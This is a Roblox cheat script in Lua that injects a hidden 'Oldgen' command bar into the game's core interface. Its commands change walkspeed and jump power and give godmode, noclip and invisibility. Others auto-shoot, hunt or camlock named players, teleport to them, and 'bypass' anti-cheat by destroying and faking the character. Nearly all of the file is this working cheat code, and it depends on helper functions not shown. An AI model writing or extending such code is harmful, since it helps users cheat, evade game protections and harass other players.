local cmdbarWIP = Instance.new("ScreenGui")
local bar = Instance.new("Frame")
local TextBox = Instance.new("TextBox")

cmdbarWIP.Name = "cmdbar(WIP)"
cmdbarWIP.Parent = game.CoreGui

bar.Name = "bar"
bar.Parent = cmdbarWIP
bar.BackgroundColor3 = Color3.fromRGB(85, 0, 255)
bar.BorderColor3 = Color3.fromRGB(125, 0, 125)
bar.BorderSizePixel = 4
bar.Position = UDim2.new(-0.00182815362, 0, 0.375446975, 0)
bar.Size = UDim2.new(0, 222, 0, 25)
bar.Visible = false

TextBox.Parent = bar
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.Position = UDim2.new(0.0135135138, 0, 0, 0)
TextBox.Size = UDim2.new(0, 219, 0, 25)
TextBox.Font = Enum.Font.Ubuntu
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(256, 256, 256)
TextBox.TextSize = 24.000
game:GetService("UserInputService").InputBegan:connect(function(keybind,chat)
	if chat then
		return
		 end
	
	if keybind.KeyCode.Name == "Semicolon" then
		bar.Visible = true
		TextBox.Text = ""
		wait(0.1) -- oooooooomggggggggggggggggggg
		TextBox:CaptureFocus()
	end
end)


TextBox.FocusLost:connect(function()
	if TextBox.Text:sub(1,10) == "walkspeed " then
		local ws = TextBox.Text:sub(11)
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Walkspeed Set To "..ws.."";
		})
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = ws


	elseif TextBox.Text:sub(1,10) == "jumppower " then
		local jp = TextBox.Text:sub(11)
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Jumppower Set To "..jp.."";
		})
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = jp

	elseif TextBox.Text:sub(1,6) == "shoot " then
		for _,v in pairs(GetPlayer(string.sub(TextBox.Text, 7)))do	
			shoottoggle = true
			Target = v
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Started Shooting At "..Target.Name.."";
			})
		end		
		game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
			if msg:sub(1, 10) == "" .. prefix .. "flyspeed " then
				local fs = msg:sub(11)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Oldgen";
					Text = "Flyspeed Set To "..fs.."";
				})
				flysettings.speed = fs
			end
		end)

	elseif TextBox.Text == "invis" then
		invis = true
		if tpbypass == true then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Cant Invis While Tpbypass Is Enabled";
			})
		else
			local l = game.Players.LocalPlayer
			local c = l.Character
			local rr = c.HumanoidRootPart
			local position = rr.Position
			local crr = rr:Clone()
			c:MoveTo(position + Vector3.new(0,9000000, 0))
			rr.Parent = nil
			wait(0.3)
			crr.Parent = c
			position = position
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Invis Enabled, Reset To Disable";
			})	
		end

	elseif TextBox.Text == "god" then
		game.Players.LocalPlayer.Character:BreakJoints()
		god = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Godmode Enabled";
		})

	elseif TextBox.Text:sub(1,8) == "predict " then
		predict = TextBox.Text:sub(9)

		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Predict Value Changed To "..predict.."";
		})

	elseif TextBox.Text == "ungod" then
		game.Players.LocalPlayer.Character:BreakJoints()
		god = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Godmode Disabled";
		})

	elseif TextBox.Text == "noclip" then
		noclip = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Noclip Enabled";
		})
	elseif TextBox.Text == "rejoin" then

		game:GetService('TeleportService'):Teleport(game.PlaceId)

	elseif TextBox.Text == "clip" then
		noclip = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Noclip Disabled";
		})

	elseif TextBox.Text == "serverhop" then
		HopServer()

	elseif TextBox.Text == "bypass" then
		if sprint == false then
			sprint = true
		end
		local me = game.Players.LocalPlayer
		local mename = game.Players.LocalPlayer.Name

		local Humanoid = Instance.new("Model" ,game.Workspace)
		Humanoid.Name = ""..mename..""
		me.Character:Destroy()

		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Bypass Enabled";
		})

	elseif TextBox.Text == "unbypass" then

		for _,v in pairs(game.workspace:GetChildren()) do

			if sprint == true then
				sprint = false
			end
			pcall(function()
			if v.Name == ""..mename.."" then
				game.workspace[mename].Parent = me
				me.Character:Destroy()

				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Oldgen";
					Text = "Bypass Disabled";
					})
		
				end
			end)
		end
	elseif TextBox.Text == "tpbypass" then
		if invis == true then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Cant Tpbypass While Invisible";
			})

		else	
			tpbypass = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Tpbypass Enabled";
			})
		end
	elseif TextBox.Text == "untpbypass" then
		tpbypass = false
		game.Players.LocalPlayer.Character:BreakJoints()
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Tpbypass Disabled";
		})

	elseif TextBox.Text:sub(1,5) == "hunt " then
		for _,v in pairs(GetPlayer(string.sub(TextBox.Text, 6)))do	
			if tpbypass == false then
				tpbypass = true
			end
			hunted = v
			Target = v
			shoottoggle = true
			hunt = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Started Hunting "..hunted.Name.."";
			})
		end
	elseif TextBox.Text == "unhunt" then
		hunt = false
		hunted = nil
		Target = nil
		shoottoggle = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Hunting";
		})


	elseif TextBox.Text == "gripgui" then
		gripgui()
	elseif TextBox.Text == "cmds" then
		showcmds()
	elseif TextBox.Text:sub(1,5) == "view " then
		for _,v in pairs(GetPlayer(string.sub(TextBox.Text, 6))) do	
			local viewing = v
			game.workspace.CurrentCamera.CameraSubject = game.Players[viewing.Name].Character
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Started Viewing "..viewing.Name.."";
			})

		end

	elseif TextBox.Text == "unview" then
		game.workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Viewing";
		})

	elseif TextBox.Text:sub(1,9) == "flyspeed " then
		local fs = TextBox.Text:sub(10)
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Flyspeed Set To "..fs.."";
		})
		flysettings.speed = fs

	elseif TextBox.Text:sub(1,5) == "goto " then
		for i,v in pairs(GetPlayer(string.sub(TextBox.Text, 6))) do	

			local goingto = v
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Teleported To "..goingto.Name.."";
			})
			if tpbypass == false then
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Oldgen";
					Text = "Enabled Tpbypass to Teleport";
				})
				tpbypass = true
			end
			game.Players.LocalPlayer.Character.Torso.CFrame = game.Players[goingto.Name].Character.Torso.CFrame
		end

	elseif TextBox.Text:sub(1,8) == "camlock " then
		for _,v in pairs(GetPlayer(string.sub(TextBox.Text, 9))) do
			camsettings.locktarget = v
			camsettings.locking = true

			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Oldgen";
				Text = "Started Camlocking "..camsettings.locktarget.Name.."";
			})
		end


	elseif TextBox.Text == "uncamlock" then
        camsettings.locktarget = nil
		camsettings.locking = false

		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Camlocking";
		})
	elseif TextBox.Text:sub(1,11) == "blinkspeed " then
		sprintspeed = TextBox.Text:sub(12)

		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Blinkspeed Value Changed To "..sprintspeed.."";
		})

	elseif TextBox.Text == "stopshoot" then
		shoottoggle = false
		Target = nil
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Shooting";
		})

	elseif TextBox.Text == "airwalk on" then
		activated = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Started Airwalking ,Ctrl To Descend";
		})
		
	elseif TextBox.Text == "airwalk off" then
		activated = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Airwalking";
		})
	elseif TextBox.Text == "spin" then
		spinning = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Started Spinning";
		})
	elseif TextBox.Text == "unspin" then
		spinning = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Stopped Spinning";
		})
		elseif TextBox.Text == "antigh" then
		antigh = true
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Anti Groundhit Enabled";
		})
	elseif TextBox.Text == "noantigh" then
		antigh = false
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Oldgen";
			Text = "Anti Groundhit Disabled";
		})
		
	end
	bar.Visible = false
end)


